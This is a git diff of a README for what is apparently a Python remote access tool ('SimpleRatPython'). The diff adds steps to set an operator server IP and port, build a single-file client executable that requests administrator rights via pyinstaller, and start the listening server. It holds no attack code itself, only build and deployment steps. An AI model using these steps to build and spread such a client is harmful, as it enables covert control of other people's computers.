@@ -51,34 +51,39 @@ Clone the repo
 
 ### Prerequisites
 
-Install library
-* pip
-  ```sh
-  pip install -r requirements.txt
-  ```
-
 ### Installation
 
 1. Get a free API Key at [https://example.com](https://example.com)
 2. Clone the repo
    ```sh
-   git clone https://github.com/github_username/repo_name.git
+   git clone https://github.com/AnkeySolutions/SimpleRatPython.git
    ```
-3. Install NPM packages
+3. Install Pip packages
+- For Windows:
    ```sh
-   npm install
+   pip install -r requirements.txt
    ```
-4. Enter your API in `config.js`
+- For Linux:
+   ```sh
+   pip3 install -r requirements.txt
+   ```
+5. Enter your <server> IP:Port in `config.json`
    ```js
-   const API_KEY = 'ENTER YOUR API';
+   ip = 'Enter your ip';
    ```
-5. Change git remote url to avoid accidental pushes to base project
+   ```js
+   port = 'Enter your port';
+   ```
+6. Build client
    ```sh
-   git remote set-url origin github_username/repo_name
-   git remote -v # confirm the changes
+   cd client
+   pyinstaller client.py --onefile --uac-admin
    ```
-
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+7. Start server
+   ```sh
+   cd server
+   python server.py --ip<ip> --port<port>
+   ```
 
 
 
